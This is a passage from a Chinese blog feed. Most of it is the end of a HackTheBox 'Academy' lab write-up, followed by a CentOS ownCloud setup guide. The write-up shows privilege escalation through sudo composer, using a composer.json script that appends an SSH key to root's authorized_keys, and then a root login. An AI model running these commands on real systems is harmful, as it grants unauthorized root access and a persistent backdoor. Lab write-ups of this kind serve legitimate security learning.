class="line">mrb3n@academy:/var/log/audit$</span><br></pre></td></tr></table></figure><h3 id="4-composer提权"><a href="#4-composer提权" class="headerlink" title="4.composer提权"></a>4.composer提权</h3><p><span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvY29tcG9zZXIv">参考<i class="fa fa-external-link-alt"></i></span></p><p><code>直接进行利用霸特失败了🙃</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mrb3n@academy:/var/log/audit$ TF=$(mktemp -d)</span><br><span class="line">mrb3n@academy:/var/log/audit$ echo &#x27;&#123;&quot;scripts&quot;:&#123;&quot;x&quot;:&quot;/bin/sh -i 0&lt;&amp;3 1&gt;&amp;3 2&gt;&amp;3&quot;&#125;&#125;&#x27; &gt;$TF/composer.json</span><br><span class="line">mrb3n@academy:/var/log/audit$ composer --working-dir=$TF run-script x</span><br><span class="line">PHP Warning:  PHP Startup: Unable to load dynamic library &#x27;mysqli.so&#x27; (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0</span><br><span class="line">PHP Warning:  PHP Startup: Unable to load dynamic library &#x27;pdo_mysql.so&#x27; (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> /bin/sh -i 0&lt;&amp;3 1&gt;&amp;3 2&gt;&amp;3</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> whoami</span></span><br><span class="line">mrb3n</span><br><span class="line"><span class="meta">$</span></span><br></pre></td></tr></table></figure><p><code>更换思路，利用ssh公钥进行提权</code></p><blockquote><p>首先使用ssh-keygen生成公钥与私钥</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# ssh-keygen </span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file in which to save the key (/root/.ssh/id_rsa): </span><br><span class="line">Enter passphrase (empty for no passphrase): </span><br><span class="line">Enter same passphrase again: </span><br><span class="line">Your identification has been saved in /root/.ssh/id_rsa</span><br><span class="line">Your public key has been saved in /root/.ssh/id_rsa.pub</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:FKBkE5JZ5qaTiSzGFeu24nBc+9uHrMC4EI1Q6/gOXnc root@JIYE</span><br><span class="line">The key&#x27;s randomart image is:</span><br><span class="line">+---[RSA 3072]----+</span><br><span class="line">|  o=B....        |</span><br><span class="line">| .oBoo   .       |</span><br><span class="line">|. .o+   .        |</span><br><span class="line">|+*o=   .         |</span><br><span class="line">|*+Bo.   S        |</span><br><span class="line">|o+.=..           |</span><br><span class="line">|+.=o+. E .       |</span><br><span class="line">|+=o..o..o .      |</span><br><span class="line">| oo   +o..       |</span><br><span class="line">+----[SHA256]-----+</span><br><span class="line">root@JIYE:~# cd .ssh/</span><br><span class="line">root@JIYE:~/.ssh# ls</span><br><span class="line">id_rsa  id_rsa.pub  known_hosts</span><br><span class="line">.pub为公钥</span><br><span class="line">root@JIYE:~/.ssh# cat id_rsa.pub </span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDIuoa+nxwrqqxtdN5zqWblCzN6U6ltR0eZXI+tnPHt2Dx/6ms2bEqSmAV66ETVyjXQKe2fHzNWdhjj4Y48M4eQY+iSR/IxqfxxLysspB0hzylreY+/ScKwvA7LcxoIUR8D5YZq5kGkGR50sO2m16l7kb2X7A9FO6SHTRPbGKlnFI7kypQCoYmgLX7czaci3Ol0pVpYAhFEiNZIt43uU8uwvGELQnj5j9pcPrJU7yDqA/Xm11PUe9x6wrUKmW3pwhiHLT/ONJm8OzBiGvIaAxEK/DvVarrt+DjrlXAugZw87aip+SlBJSpQDWPxk8rAwvCLx1lVvFRekPIvByaRwHHNYypenZHKJi8UCWwEKM004uw4gEuG6VKciPd/eCnrx5Xrufrg2IW9foB9JAFKUICN/be73uJe8DbGn0hLRN+Yr0rE7CDw+ZPqAMp4bKrf9FicUS8fS1eUmAMjIAAN6j6zbI2ftU5EaoJ27CW2evknUcSbgO7fx6hxwt0dliCpXZc= root@JIYE</span><br></pre></td></tr></table></figure><p><code>依次编写</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mrb3n@academy:~$ TF=$(mktemp -d)</span><br><span class="line">mrb3n@academy:~$ vim $TF/composer.json</span><br><span class="line">&#123;&quot;scripts&quot;:&#123;&quot;SSH&quot;:&quot;echo &#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDIuoa+nxwrqqxtdN5zqWblCzN6U6ltR0eZXI+tnPHt2Dx/6ms2bEqSmAV66ETVyjXQKe2fHzNWdhjj4Y48M4eQY+iSR/IxqfxxLysspB0hzylreY+/ScKwvA7LcxoIUR8D5YZq5kGkGR50sO2m16l7kb2X7A9FO6SHTRPbGKlnFI7kypQCoYmgLX7czaci3Ol0pVpYAhFEiNZIt43uU8uwvGELQnj5j9pcPrJU7yDqA/Xm11PUe9x6wrUKmW3pwhiHLT/ONJm8OzBiGvIaAxEK/DvVarrt+DjrlXAugZw87aip+SlBJSpQDWPxk8rAwvCLx1lVvFRekPIvByaRwHHNYypenZHKJi8UCWwEKM004uw4gEuG6VKciPd/eCnrx5Xrufrg2IW9foB9JAFKUICN/be73uJe8DbGn0hLRN+Yr0rE7CDw+ZPqAMp4bKrf9FicUS8fS1eUmAMjIAAN6j6zbI2ftU5EaoJ27CW2evknUcSbgO7fx6hxwt0dliCpXZc=&#x27; &gt;&gt; /root/.ssh/authorized_keys&quot;&#125;&#125;</span><br><span class="line"></span><br><span class="line">mrb3n@academy:~$ sudo composer --working-dir=$TF run-script SSH</span><br><span class="line">[sudo] password for mrb3n: </span><br><span class="line">PHP Warning:  PHP Startup: Unable to load dynamic library &#x27;mysqli.so&#x27; (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0</span><br><span class="line">PHP Warning:  PHP Startup: Unable to load dynamic library &#x27;pdo_mysql.so&#x27; (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0</span><br><span class="line">Do not run Composer as root/super user! See https://getcomposer.org/root for details</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">echo</span> <span class="string">&#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDIuoa+nxwrqqxtdN5zqWblCzN6U6ltR0eZXI+tnPHt2Dx/6ms2bEqSmAV66ETVyjXQKe2fHzNWdhjj4Y48M4eQY+iSR/IxqfxxLysspB0hzylreY+/ScKwvA7LcxoIUR8D5YZq5kGkGR50sO2m16l7kb2X7A9FO6SHTRPbGKlnFI7kypQCoYmgLX7czaci3Ol0pVpYAhFEiNZIt43uU8uwvGELQnj5j9pcPrJU7yDqA/Xm11PUe9x6wrUKmW3pwhiHLT/ONJm8OzBiGvIaAxEK/DvVarrt+DjrlXAugZw87aip+SlBJSpQDWPxk8rAwvCLx1lVvFRekPIvByaRwHHNYypenZHKJi8UCWwEKM004uw4gEuG6VKciPd/eCnrx5Xrufrg2IW9foB9JAFKUICN/be73uJe8DbGn0hLRN+Yr0rE7CDw+ZPqAMp4bKrf9FicUS8fS1eUmAMjIAAN6j6zbI2ftU5EaoJ27CW2evknUcSbgO7fx6hxwt0dliCpXZc=&#x27;</span> &gt;&gt; /root/.ssh/authorized_keys</span></span><br><span class="line">mrb3n@academy:~$</span><br></pre></td></tr></table></figure><p><code>ssh进行连接</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/.ssh# ssh -i id_rsa root@10.10.10.215</span><br><span class="line">kex_exchange_identification: read: Connection reset by peer</span><br><span class="line">Connection reset by 10.10.10.215 port 22</span><br><span class="line">root@JIYE:~/.ssh# ssh -i id_rsa root@10.10.10.215</span><br><span class="line">Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-52-generic x86_64)</span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line">  System information as of Wed 09 Dec 2020 11:36:12 AM UTC</span><br><span class="line">  System load:             0.0</span><br><span class="line">  Usage of /:              44.4% of 15.68GB</span><br><span class="line">  Memory usage:            21%</span><br><span class="line">  Swap usage:              0%</span><br><span class="line">  Processes:               178</span><br><span class="line">  Users logged in:         1</span><br><span class="line">  IPv4 address for ens160: 10.10.10.215</span><br><span class="line">  IPv6 address for ens160: dead:beef::250:56ff:feb9:c8a</span><br><span class="line"> * Introducing self-healing high availability clustering for MicroK8s!</span><br><span class="line">   Super simple, hardened and opinionated Kubernetes for production.</span><br><span class="line"></span><br><span class="line">     https://microk8s.io/high-availability</span><br><span class="line">0 updates can be installed immediately.</span><br><span class="line">0 of these updates are security updates.</span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line">Last login: Mon Nov  9 10:11:49 2020</span><br><span class="line">root@academy:~# ls</span><br><span class="line">academy.txt  root.txt  snap</span><br><span class="line">root@academy:~# cat root.txt </span><br><span class="line">********************</span><br><span class="line">root@academy:~#</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-简述&quot;&gt;&lt;a href=&quot;#0x00-简述&quot; class=&quot;headerlink&quot; title=&quot;0x00.简述&quot;&gt;&lt;/a&gt;0x00.简述&lt;/h2&gt;&lt;img src=&quot;/2020/12/09/HTB-academy/image-20201209140730144.png&quot; class&gt;</summary>
    
    
    
    <category term="HackTheBox" scheme="https://lunamoore.github.io/categories/HackTheBox/"/>
    
    
    <category term="靶机" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>Centos7搭建own私有网盘</title>
    <link href="https://lunamoore.github.io/2020/11/25/Centos7%E6%90%AD%E5%BB%BAown%E7%A7%81%E6%9C%89%E7%BD%91%E7%9B%98/"/>
    <id>https://lunamoore.github.io/2020/11/25/Centos7%E6%90%AD%E5%BB%BAown%E7%A7%81%E6%9C%89%E7%BD%91%E7%9B%98/</id>
    <published>2020-11-25T06:02:46.000Z</published>
    <updated>2020-11-25T07:46:43.802Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-安装apache"><a href="#1-安装apache" class="headerlink" title="1.安装apache"></a>1.安装apache</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum install httpd -y</span><br><span class="line">systemctl start httpd</span><br><span class="line">systemctl enable httpd</span><br></pre></td></tr></table></figure><h2 id="2-安装配置PHP"><a href="#2-安装配置PHP" class="headerlink" title="2.安装配置PHP"></a>2.安装配置PHP</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">yum install epel-release -y</span><br><span class="line"></span><br><span class="line">yum install -y http://rpms.remirepo.net/enterprise/remi-release-7.rpm yum-utils</span><br><span class="line"></span><br><span class="line">yum-config-manager --enable remi-php72</span><br><span class="line"></span><br><span class="line">yum install -y php php-mbstring php-gd php-mcrypt php-pear php-pspell php-pdo php-xml php-mysqlnd php-process php-pecl-zip php-xml php-intl php-zip php-zlib</span><br><span class="line"></span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="3-安装并配置Mariadb"><a href="#3-安装并配置Mariadb" class="headerlink" title="3.安装并配置Mariadb"></a>3.安装并配置Mariadb</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/yum.repos.d/MariaDB.10x.repo</span><br><span class="line">[mariadb]</span><br><span class="line">name = MariaDB</span><br><span class="line">baseurl = http://yum.mariadb.org/10.3/centos7-amd64</span><br><span class="line">gpgkey=https://yum.mariadb.org/RPM-GPG-KEY-MariaDB</span><br><span class="line">gpgcheck=1</span><br><span class="line"></span><br><span class="line">yum install -y MariaDB-server MariaDB-client</span><br><span class="line"></span><br><span class="line">systemctl start mariadb</span><br><span class="line">systemctl enable mariadb</span><br><span class="line"></span><br><span class="line">mysql_secure_installation</span><br><span class="line"></span><br><span class="line">create database ownclouddb;</span><br><span class="line">grant all privileges on ownclouddb.* to ownclouduser@localhost identified by &#x27;owncloudpwd&#x27;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><h2 id="4-安装owncloud"><a href="#4-安装owncloud" class="headerlink" title="4.安装owncloud"></a>4.安装owncloud</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/yum.repos.d/owncloud.repo</span><br><span class="line">[OwnCloud_10.x]</span><br><span class="line">name=wnCloud Server Version 10.x (CentOS 7)</span><br><span class="line">type=rpm-md</span><br><span class="line">baseurl=http://download.owncloud.org/download/repositories/production/CentOS_7</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=http://download.owncloud.org/download/repositories/production/CentOS_7/repodata/repomd.xml.key</span><br><span class="line">enabled=1</span><br><span class="line"></span><br><span class="line">yum repolist</span><br><span class="line">yum clean expire-cache</span><br><span class="line">yum install owncloud -y</span><br><span class="line">systemctl restart httpd</span><br></pre></td></tr></table></figure><h2 id="5-配置防火墙规则及SElinux或关闭"><a href="#5-配置防火墙规则及SElinux或关闭" class="headerlink" title="5.配置防火墙规则及SElinux或关闭"></a>5.配置防火墙规则及SElinux或关闭</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --permanent --add-service=http</span><br><span class="line">firewall-cmd --permanent --add-service=https</span><br><span class="line">firewall-cmd --reload</span><br><span class="line"></span><br><span class="line">systemctl stop firewalld</span><br><span class="line">iptables -F</span><br><span class="line">setenforce 0</span><br></pre></td></tr></table></figure><h2 id="6-移动目录"><a href="#6-移动目录" class="headerlink" title="6.移动目录"></a>6.移动目录</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp -a /var/www/html/owncloud/* /var/www/html/</span><br><span class="line">chown -R apache:apache home/</span><br><span class="line">systemctl restart httpd</span><br></pre></td></tr></table></figure><h2 id="7-配置页面"><a href="#7-配置页面" class="headerlink" title="7.配置页面"></a>7.配置页面</h2><h3 id="（1）配置数据库用户等"><a href="#（1）配置数据库用户等" class="headerlink" title="（1）配置数据库用户等"></a>（1）配置数据库用户等</h3><img src="/2020/11/25/Centos7%E6%90%AD%E5%BB%BAown%E7%A7%81%E6%9C%89%E7%BD%91%E7%9B%98/image-20201125151255716.png" class><h3 id="（2）登入"><a href="#（2）登入" class="headerlink" title="（2）登入"></a>（2）登入</h3><img src="/2020/11/25/Centos7%E6%90%AD%E5%BB%BAown%E7%A7%81%E6%9C%89%E7%BD%91%E7%9B%98/image-20201125151643638.png" class>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;1-安装apache&quot;&gt;&lt;a href=&quot;#1-安装apache&quot; class=&quot;headerlink&quot; title=&quot;1.安装apache&quot;&gt;&lt;/a&gt;1.安装apache&lt;/h2&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;yum install httpd -y&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;systemctl start httpd&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;systemctl enable httpd&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&quot;2-安装配置PHP&quot;&gt;&lt;a href=&quot;#2-安装配置PHP&quot; class=&quot;headerlink&quot; title=&quot;2.安装配置PHP&quot;&gt;&lt;/a&gt;2.安装配置PHP&lt;/h2&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;yum install epel-release -y&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;yum install -y http://rpms.remirepo.net/enterprise/remi-release-7.rpm yum-utils&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;yum-config-manager --enable remi-php72&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;yum install -y php php-mbstring php-gd php-mcrypt php-pear php-pspell php-pdo php-xml php-mysqlnd php-process php-pecl-zip php-xml php-intl php-zip php-zlib&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Linux服务" scheme="https://lunamoore.github.io/categories/Linux%E6%9C%8D%E5%8A%A1/"/>
    
    
    <category term="linux" scheme="https://lunamoore.github.io/tags/linux/"/>
    
  </entry>
  
</feed>
